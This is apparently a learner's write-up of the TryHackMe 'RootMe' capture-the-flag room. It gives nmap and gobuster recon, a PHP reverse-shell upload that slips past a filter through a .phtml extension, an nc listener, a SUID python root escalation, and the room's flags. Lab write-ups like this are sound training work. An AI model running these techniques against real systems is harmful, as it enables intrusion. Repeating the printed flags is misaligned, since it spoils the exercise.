# RootMe

# Task 2. Reconnaisance, general information about the target. 
    Linked IP of attach machine to 'rootme.thm' using (sudo nano /etc/hosts)
    - How many ports are open. (2)
        nmap rootme.thm -T5 -v 
            - 22/tcp open ssh
            - 80/tcp open http
    - What version of Apache is running. (2.4.29)
        nmap rootme.thm -sV -T5
            - 80/tcp open http  Apache httpd 2.4.29 ((Ubuntu))
    - What service is running on port 22. (ssh)
        nmap rootme.thm -T5 -v
            - 22/tcp open ssh
    - Find directories on the web server using the GoBuster tool. 
        gobuster -e -u rootme.thm -w common.txt 
            - cd into location of common.txt to simplify 
            - Output listed directories on the webserver, including /panel
    - What is the hidden directory. (/panel/)   

# Task 3. Getting a shell, upload file and get a reverse shell 
    -Once on '(rootme.thm)./panel' I coudl upload a file to the server
    - Used the php_reverse_shell.php from https://github.com/pentestmonkey/php-reverse-shell 
        - changed listening ip in file to my ip 
        - uploaded to server and got an error stating php files were not allowed
        - changed name of file from .php to .phtml, idea came from -> [title](https://book.hacktricks.xyz/pentesting-web/file-upload)
        - This worked and I confirmed by checking 'rootme.thm/uploads' which was another directory I found using GoBuster
        - Next, set up listener to receive a connection with the shell 
            nc -nlvp 1234 
        - Once in shell, ran 'find / -type f -name user.txt' to find file
        - cat /var/www/user.txt gave me the flag 
            - THM{y0u_g0t_a_sh3ll}
# Task 4. Privilege escalation, escalate privileges to root
    - Search for files with SUID permission, which file is weird? 
        find / -type f -user root -perm -u=s
            - this showed me files with SUID permission 
            - /usr/bin/python, was the weird file 
    - Find a form to escalate your privileges 
        python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
            - got this from [title](https://gtfobins.github.io/gtfobins/python/)
            - this escalated my priveleges to root
    - root.txt
        find / -type f -name root.txt 2> /dev/null
        cat /root/root.txt
            - This gave final flag
                - THM{pr1v1l3g3_3sc4l4t10n}



